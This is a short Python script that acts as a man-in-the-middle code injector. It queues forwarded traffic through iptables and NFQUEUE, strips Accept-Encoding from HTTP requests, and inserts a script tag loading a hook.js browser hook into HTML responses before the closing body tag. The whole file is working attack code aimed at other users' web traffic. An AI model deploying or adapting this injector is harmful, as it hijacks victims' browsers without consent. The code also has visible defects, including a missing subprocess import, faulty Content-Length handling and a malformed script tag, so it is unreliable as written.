#!/usr/bin/python2.7

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet,load):
	packet[scapy.Raw].load=load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet


def process_packet(packet):
	scapy_packet=scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load 

		if scapy_packet[scapy.TCP].dport == 80:
			print("[+] Request")
			#print scapy_packet.show()
			load = re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
			new_packet=set_load(scapy_packet,load)
			packet.set_payload(str(new_packet))

		elif scapy_packet[scapy.TCP].sport == 80:
			print("[+] Response")
			#print scapy_packet.show()
			load=scapy_packet[scapy.Raw].load.replace("</body>", "<script src=\"http://0.0.0.0:61985/hook.js;type=\"text/javascript\"></script></body>")
			new_packet=set_load(scapy_packet,load)
			packet.set_payload(str(new_packet))
			content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)

			if content_length_search and "text/html" in load:
				content_length=content_length_search.group(1)
				new_content_length=int(content_length)+len(load)
				load = load.replace(content_length,str(new_content_length))

		if load != scapy_packet[scapy.Raw].load:
			new_packet=set_load(scapy_packet,load)
			packet.set_payload(str(new_packet))

	packet.accept()



try:
    # For use on local machine
    # subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    # subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)

    # For use on remote machine
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
